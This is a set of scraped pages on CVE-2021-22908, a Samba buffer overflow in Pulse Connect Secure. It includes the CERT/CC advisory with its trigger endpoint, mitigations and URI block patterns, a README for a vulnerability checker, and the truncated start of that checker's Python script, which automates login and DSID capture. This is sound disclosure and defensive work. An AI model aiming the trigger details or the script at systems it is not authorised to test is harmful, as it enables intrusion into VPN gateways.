=== Content from github.com_9031104c_20250115_221931.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCERTCC%2FPoC-Exploits%2Ftree%2Fmaster%2Fcve-2021-22908)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCERTCC%2FPoC-Exploits%2Ftree%2Fmaster%2Fcve-2021-22908)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=CERTCC%2FPoC-Exploits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on May 15, 2024. It is now read-only.

[CERTCC](/CERTCC)
/
**[PoC-Exploits](/CERTCC/PoC-Exploits)**
Public archive

* [Notifications](/login?return_to=%2FCERTCC%2FPoC-Exploits) You must be signed in to change notification settings
* [Fork
  48](/login?return_to=%2FCERTCC%2FPoC-Exploits)
* [Star
   183](/login?return_to=%2FCERTCC%2FPoC-Exploits)

* [Code](/CERTCC/PoC-Exploits)
* [Issues
  0](/CERTCC/PoC-Exploits/issues)
* [Pull requests
  0](/CERTCC/PoC-Exploits/pulls)
* [Actions](/CERTCC/PoC-Exploits/actions)
* [Projects
  0](/CERTCC/PoC-Exploits/projects)
* [Security](/CERTCC/PoC-Exploits/security)
* [Insights](/CERTCC/PoC-Exploits/pulse)

Additional navigation options

* [Code](/CERTCC/PoC-Exploits)
* [Issues](/CERTCC/PoC-Exploits/issues)
* [Pull requests](/CERTCC/PoC-Exploits/pulls)
* [Actions](/CERTCC/PoC-Exploits/actions)
* [Projects](/CERTCC/PoC-Exploits/projects)
* [Security](/CERTCC/PoC-Exploits/security)
* [Insights](/CERTCC/PoC-Exploits/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.kb.cert.org_e268bd5b_20250115_221937.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#667933

## Pulse Connect Secure Samba buffer overflow

#### Vulnerability Note VU#667933

Original Release Date: 2021-05-24 | Last Revised: 2021-06-17

---

### Overview

Pulse Connect Secure (PCS) gateway contains a buffer overflow vulnerability in Samba-related code that may allow an authenticated remote attacker to execute arbitrary code.

### Description

**CVE-2021-22908**

PCS includes the ability to connect to Windows file shares (SMB). This capability is provided by a number of CGI scripts, which in turn use libraries and helper applications based on Samba 4.5.10. When specifying a long server name for some SMB operations, the `smbclt` application may crash due to either a stack buffer overflow or a heap buffer overflow, depending on how long of a server name is specified. We have confirmed that PCS 9.1R11.4 systems are vulnerable, targeting a CGI endpoint of: `/dana/fb/smb/wnf.cgi`. Other CGI endpoints may also trigger the vulnerable code.

Specifying a long server name to this endpoint may result in a PCS events log entry that may look like the following:

```
Critical ERR31093 2021-05-24Â 14:05:37Â -Â iveÂ -Â [127.0.0.1]Â Root::System()[]Â -Â Program smbclt recently failed.

```

Successful exploitation of this vulnerability may not produce such a log entry if the program is cleanly exited during exploitation, or if the log files are sanitized after successful exploitation.

In order to be vulnerable, a PCS server must have a Windows File Access policy that **allows** `\\*` or it must have some other policy set that would allow an attacker to connect to an arbitrary server. In the administrative page for the PCS, see `Users -> Resource Policies -> Windows File Access Policies` to view your current SMB policy. Any PCS device that started as version 9.1R2 or earlier will have a default policy that allows connecting to arbitrary SMB hosts. Starting with 9.1R3, this policy was changed from a default allow to a default deny.

Note that the vendor implies that the `Files, Window[sic]` access feature can be disabled for user roles in order to protect against this vulnerability. This is **NOT** the case. The vulnerable CGI endpoints are still reachable in ways that will trigger the `smbclt` application to crash, regardless of whether the `Files, Windows` user role is enabled or not. These steps are only included in the advisory to limit excessive errors showing up in PCS logs after the XML workaround has been installed.

In our testing, an attacker would need either valid PCS user credentials, or a `DSID` value from an authenticated user to successfully reach the vulnerable code on a PCS server that has an open Windows File Access policy. We have created a [PoC utility to test for PCS systems vulnerable to CVE-2021-22908](https://github.com/CERTCC/PoC-Exploits/tree/master/cve-2021-22908) as well as which mitigations may be applied.

### Impact

By performing certain SMB operations with a specially-crafted server name, an authenticated attacker may be able to execute arbitrary code with root privileges on a vulnerable PCS server.

### Solution

#### Apply an update

This issue is addressed in PCS 9.1R11.5. Please see advisory [SA44800](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44800) for more details.

#### Apply an XML workaround

Pulse Secure has published advisory [SA44800](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44800) that mentions a [Workaround-2105.xml](https://my.pulsesecure.net/) file that contains a mitigation to protect against this vulnerability. [Importing this XML workaround](https://docs.pulsesecure.net/WebHelp/PCS/9.1R1/AG/Content/PCS/PCS_AdminGuide_9.1R1/Importing_an_XML_Configuration.htm) will activate the protections immediately and does not require any downtime for the VPN system. This workaround will block requests that match the following URI patterns:

```
^/+dana/+fb/+smb
^/+dana-cached/+fb/+smb

```

`Workaround-2105.xml` will automatically deactivate the mitigations applied by `Workaround-2104.xml` when it is installed. As such, it is imperative that a PCS system is running 9.1R11.4 **before** applying the `Workaround-2105.xml` mitigation, which will ensure that the vulnerabilities outlined in [SA44784](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784) are not reintroduced as the result of applying this workaround.

Note that installing this workaround will block the ability to use the following feature:

* Windows File Share Browser

#### Set a Windows File Access Policy

This vulnerability relies on the ability to connect to an arbitrary SMB server name to trigger the vulnerability. A PCS system that started as version 9.1R3 or later will have a default Initial File Browsing Policy of **Deny** for `\\*` SMB connections. If you have a PCS system that started as 9.1R2 or earlier, it will retain the default Initial File Browsing Policy of **Allow** for `\\*` SMB connections, which will expose this vulnerability. In the administrative page for the PCS, see `Users -> Resource Policies -> Windows File Access Policies` to view your current SMB policy.

If your PCS has a policy that explicitly allows `\\*` or otherwise may allow users to initiate connections to arbitrary SMB server names, you should configure the PCS to **Deny** connections to such resources to minimize your PCS attack surface.

### Acknowledgements

This vulnerability was reported by Will Dormann of the CERT/CC.

This document was written by Will Dormann.

### Vendor Information

667933
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

### [Ivanti](#Ivanti) Affected

Notified:  2021-06-09
Updated: 2021-06-17

| **CVE-2021-22908** | Affected |
| --- | --- |

#### Vendor Statement

We have not received a statement from the vendor.

#### References

* <https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44800>

### [Pulse Secure](#Pulse%20Secure) Affected

Notified:  2021-05-06
Updated: 2021-05-25

**Statement Date:   May 25, 2021**

| **CVE-2021-22908** | Affected |
| --- | --- |

#### Vendor Statement

Buffer Overflow in Windows File Resource Profiles in 9.X allows a remote authenticated user with privileges to browse SMB shares to execute arbitrary code as the root user. As of version 9.1R3, this permission is not enabled by default.

#### References

* <https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44800/?kA23Z000000boUgSAI>

### References

* <https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44800>
* <https://github.com/CERTCC/PoC-Exploits/blob/master/cve-2021-22908/cve-2021-22908.py>

### Other Information

| **CVE IDs:** | [CVE-2021-22908](http://web.nvd.nist.gov/vuln/detail/CVE-2021-22908) |
| --- | --- |
| **Date Public:** | 2021-05-24 |
| **Date First Published:** | 2021-05-24 |
| **Date Last Updated:** | 2021-06-17 20:42 UTC |
| **Document Revision:** | 8 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from kb.pulsesecure.net_4bac775f_20250115_091724.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from github.com_9031104c_20250115_134215.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCERTCC%2FPoC-Exploits%2Ftree%2Fmaster%2Fcve-2021-22908)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCERTCC%2FPoC-Exploits%2Ftree%2Fmaster%2Fcve-2021-22908)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=CERTCC%2FPoC-Exploits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on May 15, 2024. It is now read-only.

[CERTCC](/CERTCC)
/
**[PoC-Exploits](/CERTCC/PoC-Exploits)**
Public archive

* [Notifications](/login?return_to=%2FCERTCC%2FPoC-Exploits) You must be signed in to change notification settings
* [Fork
  48](/login?return_to=%2FCERTCC%2FPoC-Exploits)
* [Star
   183](/login?return_to=%2FCERTCC%2FPoC-Exploits)

* [Code](/CERTCC/PoC-Exploits)
* [Issues
  0](/CERTCC/PoC-Exploits/issues)
* [Pull requests
  0](/CERTCC/PoC-Exploits/pulls)
* [Actions](/CERTCC/PoC-Exploits/actions)
* [Projects
  0](/CERTCC/PoC-Exploits/projects)
* [Security](/CERTCC/PoC-Exploits/security)
* [Insights](/CERTCC/PoC-Exploits/pulse)

Additional navigation options

* [Code](/CERTCC/PoC-Exploits)
* [Issues](/CERTCC/PoC-Exploits/issues)
* [Pull requests](/CERTCC/PoC-Exploits/pulls)
* [Actions](/CERTCC/PoC-Exploits/actions)
* [Projects](/CERTCC/PoC-Exploits/projects)
* [Security](/CERTCC/PoC-Exploits/security)
* [Insights](/CERTCC/PoC-Exploits/pulse)

## Files

 master
## Breadcrumbs

1. [PoC-Exploits](/CERTCC/PoC-Exploits/tree/master)
/
# cve-2021-22908

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/CERTCC/PoC-Exploits/commits/master/cve-2021-22908) master
## Breadcrumbs

1. [PoC-Exploits](/CERTCC/PoC-Exploits/tree/master)
/
# cve-2021-22908

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/CERTCC/PoC-Exploits/tree/master) | | |
| [README.md](/CERTCC/PoC-Exploits/blob/master/cve-2021-22908/README.md "README.md") | | [README.md](/CERTCC/PoC-Exploits/blob/master/cve-2021-22908/README.md "README.md") |  |  |
| [cve-2021-22908.py](/CERTCC/PoC-Exploits/blob/master/cve-2021-22908/cve-2021-22908.py "cve-2021-22908.py") | | [cve-2021-22908.py](/CERTCC/PoC-Exploits/blob/master/cve-2021-22908/cve-2021-22908.py "cve-2021-22908.py") |  |  |
| View all files | | |

## [README.md](#readme)

# cve-2021-22908

This python3 script checks for Pulse Connect Secure servers vulnerable to
[VU#667933](https://www.kb.cert.org/vuls/id/667933) CVE-2021-22908. The python requests library is required for operation.

## Usage modes:

`cve-2021-22908.py <host>`

This mode will interactively log in to a PCS server to obtain a DSID value.

`cve-2021-22908.py <host> -d <DSID>`

In the case were a PCS user's DSID is already known, this mode will skip the
interactive login exchange.

`cve-2021-22908.py <host> -n`

If you do not have authentication available for the target PCS, you can check
for only the presence of the Workaround-2105.xml mitigation.

## Results:

`HTTP 500`

This is indicative of a vulnerable PCS server, due to a crashing CGI.

`HTTP 403. XML workaround applied`

This is indicative of a PCS server that has an XML mitigation applied.

`HTTP 200. Windows File Access Policies prevents exploitation.`

This is indicative of a PCS server that has "Windows File Access Policies"
configured in a way that prevents exploitation.

`HTTP %s. Not vulnerable.`

The PCS server does not appear to be vulnerable.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from kb.pulsesecure.net_de6a4cf0_20250115_221936.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from github.com_a2777c3e_20250115_221933.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCERTCC%2FPoC-Exploits%2Fblob%2Fmaster%2Fcve-2021-22908%2Fcve-2021-22908.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCERTCC%2FPoC-Exploits%2Fblob%2Fmaster%2Fcve-2021-22908%2Fcve-2021-22908.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=CERTCC%2FPoC-Exploits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

This repository has been archived by the owner on May 15, 2024. It is now read-only.

[CERTCC](/CERTCC)
/
**[PoC-Exploits](/CERTCC/PoC-Exploits)**
Public archive

* [Notifications](/login?return_to=%2FCERTCC%2FPoC-Exploits) You must be signed in to change notification settings
* [Fork
  48](/login?return_to=%2FCERTCC%2FPoC-Exploits)
* [Star
   183](/login?return_to=%2FCERTCC%2FPoC-Exploits)

* [Code](/CERTCC/PoC-Exploits)
* [Issues
  0](/CERTCC/PoC-Exploits/issues)
* [Pull requests
  0](/CERTCC/PoC-Exploits/pulls)
* [Actions](/CERTCC/PoC-Exploits/actions)
* [Projects
  0](/CERTCC/PoC-Exploits/projects)
* [Security](/CERTCC/PoC-Exploits/security)
* [Insights](/CERTCC/PoC-Exploits/pulse)

Additional navigation options

* [Code](/CERTCC/PoC-Exploits)
* [Issues](/CERTCC/PoC-Exploits/issues)
* [Pull requests](/CERTCC/PoC-Exploits/pulls)
* [Actions](/CERTCC/PoC-Exploits/actions)
* [Projects](/CERTCC/PoC-Exploits/projects)
* [Security](/CERTCC/PoC-Exploits/security)
* [Insights](/CERTCC/PoC-Exploits/pulse)

## Files

 master
## Breadcrumbs

1. [PoC-Exploits](/CERTCC/PoC-Exploits/tree/master)
2. /[cve-2021-22908](/CERTCC/PoC-Exploits/tree/master/cve-2021-22908)
/
# cve-2021-22908.py

Copy path Blame  Blame
## Latest commit

## History

[History](/CERTCC/PoC-Exploits/commits/master/cve-2021-22908/cve-2021-22908.py)263 lines (239 loc) · 10.1 KB master
## Breadcrumbs

1. [PoC-Exploits](/CERTCC/PoC-Exploits/tree/master)
2. /[cve-2021-22908](/CERTCC/PoC-Exploits/tree/master/cve-2021-22908)
/
# cve-2021-22908.py

Top
## File metadata and controls

* Code
* Blame

263 lines (239 loc) · 10.1 KB[Raw](https://github.com/CERTCC/PoC-Exploits/raw/refs/heads/master/cve-2021-22908/cve-2021-22908.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263#!/usr/bin/env python3# Utility to check for Pulse Connect Secure CVE-2021-22908# https://www.kb.cert.org/vuls/id/667933
import requestsfrom requests.packages.urllib3.exceptions import InsecureRequestWarningimport argparseimport sysfrom html.parser import HTMLParserimport getpass
parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')parser.add\_argument('host', type=str, help='PCS IP or hostname)')parser.add\_argument('-u', '--user', dest='user', type=str, help='username')parser.add\_argument('-p', '--pass', dest='password', type=str, help='password')parser.add\_argument('-r', '--realm', dest='realm', type=str, help='realm')parser.add\_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')parser.add\_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')parser.add\_argument('-n', '--noauth', action='store\_true', help='Do not authenticate. Only check for XML workaround')
args = parser.parse\_args()
requests.packages.urllib3.disable\_warnings(InsecureRequestWarning)
class formvaluefinder(HTMLParser): def \_\_init\_\_(self, searchval): super(type (self), self).\_\_init\_\_() self.searchval = searchval def handle\_starttag(self, tag, attrs): if tag == 'input': # We're just looking for form <input> tags foundelement = False for attr in attrs: if(attr[0] == 'name'): if(attr[1] == self.searchval): foundelement = True elif(attr[0] == 'value' and foundelement == True): self.data = attr[1]
class preauthfinder(HTMLParser): foundelement = False def handle\_starttag(self, tag, attrs): if tag == 'textarea': # We're just looking for <textarea> tags foundelement = False for attr in attrs: if(attr[0] == 'id'): if(attr[1] == 'sn-preauth-text\_2'): self.foundelement = True def handle\_data(self, data): if self.foundelement: self.data = data self.foundelement = False
def get\_realm(host, defaulturi): realm = None print('Getting default realm for %s...' % host) url = 'https://%s%s' % (host,defaulturi) res = None try: res = requests.get(url, verify=False, timeout=10) except requests.exceptions.ConnectionError: print('Error retrieving %s' % url)
 if res: if res.status\_code == 200: html = str(res.content) if 'sn-preauth-text\_2' in html: print('Preauth required...') parser = preauthfinder() parser.feed(html) preauthtext = parser.data values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'} res = requests.post(res.url, data=values, verify=False, allow\_redirects=False, timeout=10) if res.content: parser = formvaluefinder('realm') parser.feed(str(res.content)) realm = parser.data else: print('Error retrieving login page')
 else: parser = formvaluefinder('realm') parser.feed(html) realm = parser.data return realm
def get\_dsid(host, defaulturi, realm, user, password): dsid = None loginuri = defaulturi.replace('welcome.cgi', 'login.cgi') url = 'https://%s%s' % (host,loginuri) values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'} res = requests.post(url, data=values, verify=False, allow\_redirects=False, timeout=10) if 'confirm' in res.headers['location']: # Redirect to "user-confirm" that they still want to log in, despite already # having an active session print('User session is already active! Proceeding...') res = requests.post(url, data=values, verify=False, allow\_redirects=True, timeout=10) parser = formvaluefinder('FormDataStr') parser.feed(str(res.content)) formdata = parser.data values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata} res = requests.post(url, data=values, verify=False, allow\_redirects=False, timeout=10) for cookie in res.cookies: if cookie.name == 'DSID': dsid = cookie.value elif 'cred' in res.headers['location']: # This is a pulse that requires 2FA res = requests.post(url, data=values, verify=False, allow\_redirects=False, timeout=10) for cookie in res.cookies: if cookie.name == 'id': key = cookie.value password2 = input('MFA code: ') values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'} cookies = {'id': key, 'DSSigninNotif': '1'} res = requests.post(url, data=values, cookies=cookies, verify=False, allow\_redirects=False, timeout=10) if 'confirm' in res.headers['location']: # Redirect to "user-confirm" that they still want to log in, despite already # having an active session print('User session is already active! Proceeding...') res = requests.post(url, data=values, cookies=cookies, verify=False, allow\_redirects=True, timeout=10) parser = formvaluefinder('FormDataStr') parser.feed(str(res.content)) formdata = parser.data values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata} res = requests.post(url, data=values, cookies=cookies, verify=False, allow\_redirects=False, timeout=10) for cookie in res.cookies: if cookie.name == 'DSID': dsid = cookie.value else: for cookie in res.cookies: if cookie.name == 'DSID': dsid = cookie.value elif 'failed' in res.headers['location']: print('Login failed!') else: # Login accepted for cookie in res.cookies: if cookie.name == 'DSID': dsid = 